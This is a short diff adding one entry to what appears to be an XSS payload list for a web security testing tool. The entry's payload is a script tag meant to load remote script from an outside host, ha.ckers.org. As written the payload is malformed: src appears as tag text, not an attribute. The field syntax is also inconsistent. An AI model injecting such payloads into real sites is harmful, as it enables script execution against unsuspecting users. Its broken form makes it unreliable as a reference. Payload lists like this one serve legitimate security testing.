@@ -1,0 +1,5 @@
+[Payload]
+type = xss
+title = Load SRC Property
+description: The src property sets or retrieves the location of a file containing scripting code.
+payload = <script> src="http://ha.ckers.org/xss.js"</script>
